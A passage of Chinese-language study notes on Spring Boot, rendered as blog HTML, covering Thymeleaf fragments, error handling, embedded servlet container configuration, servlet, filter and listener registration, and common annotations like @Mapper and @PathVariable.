class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="为了防止表单重复提交可以使用重定向”redirect-x2F-“-但是还需要一个拦截器来防止随便复制地址就能登陆的问题"><a href="#为了防止表单重复提交可以使用重定向”redirect-x2F-“-但是还需要一个拦截器来防止随便复制地址就能登陆的问题" class="headerlink" title="为了防止表单重复提交可以使用重定向”redirect:&#x2F;“;但是还需要一个拦截器来防止随便复制地址就能登陆的问题"></a>为了防止表单重复提交可以使用重定向”redirect:&#x2F;“;但是还需要一个拦截器来防止随便复制地址就能登陆的问题</h5><h3 id="thymeleaf公共片段抽取-就是将页面重复的元素抽取出来"><a href="#thymeleaf公共片段抽取-就是将页面重复的元素抽取出来" class="headerlink" title="thymeleaf公共片段抽取(就是将页面重复的元素抽取出来)"></a>thymeleaf公共片段抽取(就是将页面重复的元素抽取出来)</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;--th:fragment = &quot;name&quot;将元素抽取为名为name的片段如:--&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;copy&quot;</span>&gt;</span><br>    sadfkjahsdfkjahsdfk<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>引用公共片段<br>&lt;--1.th:insert=&quot;~&#123;templatename(网页名称) :: selector(选择器)(后边加个括号可以写创建的参数如图1)&#125;&quot;或&quot;~&#123;templatename::fragmentname&#125;&quot;--&gt;会在一个标签内部插入一个元素<br>&lt;--2.th:replace = &quot;~&#123;templatename(网页名称) :: selector(选择器)&#125;&quot;或&quot;~&#123;templatename::fragmentname&#125;&quot;--&gt;将声明引入的标签替换成引用的元素<br>&lt;--3.th:include=&quot;~&#123;templatename(网页名称) :: selector(选择器)&#125;&quot;或&quot;~&#123;templatename::fragmentname&#125;&quot;--&gt;把引入的内容插入到标签中不引入最外层标签<br>    <br>行内写法<br>    [[~&#123;&#125;]];<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">循环读取出元素数据<br><span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;emp:$&#123;emps&#125;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;emp.getId()&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;emp.getLastName()&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;emp.getEmail()&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;emp.getGender()==0?&#x27;女&#x27;:&#x27;男&#x27;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;emp.getDepartment()&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--利用dates的系统静态方法来格式化日期--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;#dates.format(emp.birth,&#x27;yyyy-mm-dd HH:mm&#x27;)&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="对于Post请求方法想要获得参数必须将表单名字一一进行对应-并且如果是对象参数的话-对象属性要和表单名字一一对应才能实现自动传参的功能"><a href="#对于Post请求方法想要获得参数必须将表单名字一一进行对应-并且如果是对象参数的话-对象属性要和表单名字一一对应才能实现自动传参的功能" class="headerlink" title="对于Post请求方法想要获得参数必须将表单名字一一进行对应,并且如果是对象参数的话,对象属性要和表单名字一一对应才能实现自动传参的功能"></a>对于Post请求方法想要获得参数必须将表单名字一一进行对应,并且如果是对象参数的话,对象属性要和表单名字一一对应才能实现自动传参的功能</h5><h5 id="修改日期的格式spring-mvc-date-format-x3D-yyyy-x2F-mm-x2F-dd-例子"><a href="#修改日期的格式spring-mvc-date-format-x3D-yyyy-x2F-mm-x2F-dd-例子" class="headerlink" title="修改日期的格式spring.mvc.date-format &#x3D; yyyy&#x2F;mm&#x2F;dd(例子)"></a>修改日期的格式spring.mvc.date-format &#x3D; yyyy&#x2F;mm&#x2F;dd(例子)</h5><h2 id="springBoot的错误处理机制"><a href="#springBoot的错误处理机制" class="headerlink" title="springBoot的错误处理机制"></a>springBoot的错误处理机制</h2><h5 id="默认效果"><a href="#默认效果" class="headerlink" title="默认效果:"></a>默认效果:</h5><p>​1.PC端返回一个错误页面</p><p>​2.客户端,返回一个json数据</p><h5 id="定制错误响应"><a href="#定制错误响应" class="headerlink" title="定制错误响应"></a>定制错误响应</h5><p>​系统自带的ErrorMvcAutoConfiguration错误处理的自动配置添加了下面这些组件</p><p>​1.DefaultErrorAttributes帮助我们在页面共享信息</p><p>​2.BasicErrorController处理默认的error请求</p><p>​3.ErrorPageCustomizer系统出现错误后来到error请求进行处理</p><p>​4.DefaultErrorViewResolver默认springboot会找到某个页面</p><p>​出错步骤:</p><p>​发生4xx或者5xx错误先启动ErrorPageCustomizer会生效,然后来到&#x2F;error请求</p><p>​定制错误响应：</p><p>​1.如何定制错误页面</p><p>​（1）有模板引擎（模板引擎一般在template下）的情况下error&#x2F;404.html</p><p>​（2）没有模板引擎放到静态资源下</p><p>​（3）以上都没有、默认来到springboot的空白页面</p><p>​可以使用4xx和5xx会自动匹配这种类型的错误，如果有精确到404等这样的页面就先寻找这样的页面</p><p>​2.页面共享的能获取的信息：</p><p>​timestamp：时间戳</p><p>​status：状态码</p><p>​error：错误提示</p><p>​exception：异常</p><p>​message：异常消息</p><p>​errors：jsr303数据校验错误都在这里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">浏览器和其他的都是json返回<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@ExceptionHandler(MyException.class)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String,Object&gt; <span class="hljs-title function_">handleException</span><span class="hljs-params">(Exception e)</span>&#123;<br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-string">&quot;user.notexist&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;message&quot;</span>,e.getMessage());<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br><br><br>自己定制错误页面的json<br><br>这句代码意思是实现一个自己的异常处理器然后设置状态码并进行页面的跳转但是不显示自己的map数据<br>    <span class="hljs-meta">@ExceptionHandler(MyException.class)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handleException</span><span class="hljs-params">(Exception e, HttpServletRequest request)</span>&#123;<br>        <span class="hljs-comment">//设置自己的状态码</span><br>        request.setAttribute(<span class="hljs-string">&quot;javax.servlet.error.status_code&quot;</span>,<span class="hljs-number">400</span>);<br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-string">&quot;user.notexist&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;message&quot;</span>,e.getMessage());<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/error&quot;</span>;<br>    &#125;<br>由于这个代码<br><span class="hljs-meta">@ConditionalOnMissingBean(value = ErrorAttributes.class)</span><br>所以当容器中没有ErrorAttributes时就会自动添加一个ErrorAttributes<br></code></pre></td></tr></table></figure><h1 id="配置嵌入式Servlet容器"><a href="#配置嵌入式Servlet容器" class="headerlink" title="配置嵌入式Servlet容器"></a>配置嵌入式Servlet容器</h1><p>springBoot默认使用Tomcat作为嵌入式的servlet容器</p><p>1、如何定制和修改servlet容器的相关配置</p><p>​修改和server相关的配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span> = <span class="hljs-string">8081</span><br><span class="hljs-attr">//通用的servlet容器配置</span><br><span class="hljs-attr">server.xxx</span><br><span class="hljs-attr">//如Tomcat设置</span><br><span class="hljs-attr">server.tomcat.xxx</span><br></code></pre></td></tr></table></figure><p>​编写一个WebServerFactoryCustomizer<ConfigurableWebServerFactory>:嵌入式的servlet容器制定器来修改servlet容器的配置</ConfigurableWebServerFactory></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> WebServerFactoryCustomizer&lt;ConfigurableWebServerFactory&gt; <span class="hljs-title function_">webServerFactoryCustomizer</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebServerFactoryCustomizer</span>&lt;ConfigurableWebServerFactory&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">customize</span><span class="hljs-params">(ConfigurableWebServerFactory factory)</span> &#123;<br>                factory.setPort(<span class="hljs-number">8081</span>);<br>            &#125;<br>        &#125;;<br>    &#125;<br></code></pre></td></tr></table></figure><p>​注册Spring的三大组件</p><p>​1.ServletRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//注册Servlet</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><br><br>        doPost(req,resp);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <br>        resp.getWriter().write(<span class="hljs-string">&quot;Hello&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//注册到@Bean中</span><br> <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ServletRegistrationBean <span class="hljs-title function_">myServlet</span><span class="hljs-params">()</span>&#123;<br>        ServletRegistrationBean&lt;Servlet&gt; servletServletRegistrationBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRegistrationBean</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyServlet</span>(),<span class="hljs-string">&quot;/MyServlet&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> servletServletRegistrationBean;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>​2.FilterRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//注册Filter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//添加到Bean中</span><br><span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> FilterRegistrationBean <span class="hljs-title function_">filterRegistrationBean</span><span class="hljs-params">()</span>&#123;<br>        FilterRegistrationBean&lt;Filter&gt; filterFilterRegistrationBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterRegistrationBean</span>&lt;&gt;();<br><br>        filterFilterRegistrationBean.setUrlPatterns(Arrays.asList(<span class="hljs-string">&quot;/hello&quot;</span>,<span class="hljs-string">&quot;/myServlet&quot;</span>));<br>        filterFilterRegistrationBean.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyFilter</span>());<br>        <span class="hljs-keyword">return</span> filterFilterRegistrationBean;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>​3.ServletListenerRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//注册</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContextListener</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextInitialized</span><span class="hljs-params">(ServletContextEvent sce)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Initialized&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextDestroyed</span><span class="hljs-params">(ServletContextEvent sce)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Destroyed&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//添加到Bean中</span><br><span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ServletListenerRegistrationBean&lt;MyListener&gt; <span class="hljs-title function_">myRegistration</span><span class="hljs-params">()</span>&#123;<br>        ServletListenerRegistrationBean&lt;MyListener&gt; registrationBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletListenerRegistrationBean</span>&lt;MyListener&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyListener</span>());<br>        <span class="hljs-keyword">return</span> registrationBean;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="x2F-或拦截jsp请求但是-x2F-不会"><a href="#x2F-或拦截jsp请求但是-x2F-不会" class="headerlink" title="&#x2F;*或拦截jsp请求但是&#x2F;不会"></a>&#x2F;*或拦截jsp请求但是&#x2F;不会</h2><p>可以通过server.servletPath来修改springMVC前端控制器默认拦截的请求路径</p><p>2、能否支持其他的servlet容器</p><p>​在pom.xml里面添加要依赖的容器即可</p><p>​默认支持Tomcat</p><p>​Jetty</p><p>​Undertow</p><p>嵌入式Servlet容器自动配置原理;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这个类表示决定采用哪种servlet容器重点在于ConditionalOnClass</span><br><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication</span><br><span class="hljs-meta">@EnableConfigurationProperties(ServerProperties.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmbeddedWebServerFactoryCustomizerAutoConfiguration</span> &#123;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Nested configuration if Tomcat is being used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Tomcat.class, UpgradeProtocol.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TomcatWebServerFactoryCustomizerConfiguration</span> &#123;<br><br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> TomcatWebServerFactoryCustomizer <span class="hljs-title function_">tomcatWebServerFactoryCustomizer</span><span class="hljs-params">(Environment environment,</span><br><span class="hljs-params">ServerProperties serverProperties)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TomcatWebServerFactoryCustomizer</span>(environment, serverProperties);<br>&#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Nested configuration if Jetty is being used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Server.class, Loader.class, WebAppContext.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JettyWebServerFactoryCustomizerConfiguration</span> &#123;<br><br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> JettyWebServerFactoryCustomizer <span class="hljs-title function_">jettyWebServerFactoryCustomizer</span><span class="hljs-params">(Environment environment,</span><br><span class="hljs-params">ServerProperties serverProperties)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JettyWebServerFactoryCustomizer</span>(environment, serverProperties);<br>&#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Nested configuration if Undertow is being used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Undertow.class, SslClientAuthMode.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UndertowWebServerFactoryCustomizerConfiguration</span> &#123;<br><br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> UndertowWebServerFactoryCustomizer <span class="hljs-title function_">undertowWebServerFactoryCustomizer</span><span class="hljs-params">(Environment environment,</span><br><span class="hljs-params">ServerProperties serverProperties)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndertowWebServerFactoryCustomizer</span>(environment, serverProperties);<br>&#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Nested configuration if Netty is being used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnClass(HttpServer.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NettyWebServerFactoryCustomizerConfiguration</span> &#123;<br><br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> NettyWebServerFactoryCustomizer <span class="hljs-title function_">nettyWebServerFactoryCustomizer</span><span class="hljs-params">(Environment environment,</span><br><span class="hljs-params">ServerProperties serverProperties)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NettyWebServerFactoryCustomizer</span>(environment, serverProperties);<br>&#125;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="注解类"><a href="#注解类" class="headerlink" title="注解类"></a>注解类</h1><h4 id="Order"><a href="#Order" class="headerlink" title="@Order"></a>@Order</h4><p>springsecurity中注解去调整自定义过滤器在过滤器链中的位置。</p><h4 id="Mapper"><a href="#Mapper" class="headerlink" title="@Mapper"></a>@Mapper</h4><p>将结构托管给springboot并变成实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserDAO</span> &#123;<br>   <span class="hljs-comment">//代码</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="MapperScan"><a href="#MapperScan" class="headerlink" title="@MapperScan"></a>@MapperScan</h4><p>指定要变成实现类的接口所在的包，然后包下面的所有接口在编译之后都会生成相应的实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-meta">@MapperScan(&quot;com.winter.dao&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringbootMybatisDemoApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(SpringbootMybatisDemoApplication.class, args);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="Controller-name-x3D-””"><a href="#Controller-name-x3D-””" class="headerlink" title="@Controller(name&#x3D;””)"></a>@Controller(name&#x3D;””)</h4><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 给组件重新定义一个名字如果不为空的话</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h4 id="PathVariable"><a href="#PathVariable" class="headerlink" title="@PathVariable"></a>@PathVariable</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@PathVariable</span>(<span class="hljs-string">&quot;xxx&quot;</span>)<br>通过 <span class="hljs-variable">@PathVariable</span> 可以将URL中占位符参数&#123;<span class="hljs-selector-tag">xxx</span>&#125;绑定到处理器类的方法形参中@<span class="hljs-selector-tag">PathVariable</span>(“xxx“) <br> <br>@<span class="hljs-selector-tag">RequestMapping</span>(value=”user/&#123;<span class="hljs-selector-tag">id</span>&#125;/&#123;<span class="hljs-selector-tag">name</span>&#125;”)<br>请求路径：<span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//localhost:8080/hello/show5/1/james</span><br></code></pre></td></tr></table></figure><p>@ModelAttribute</p><blockquote><p><code>@ModelAttribute</code>注解注释的方法会在此controller每个方法执行前被执行</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldController</span> &#123;<br><br>    <span class="hljs-meta">@ModelAttribute</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">populateModel</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String abc, Model model)</span> &#123;<br>       model.addAttribute(<span class="hljs-string">&quot;attributeName&quot;</span>, abc);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/helloWorld&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">helloWorld</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;helloWorld&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Resource"><a href="#Resource" class="headerlink" title="@Resource"></a>@Resource</h4><figure class="highlight 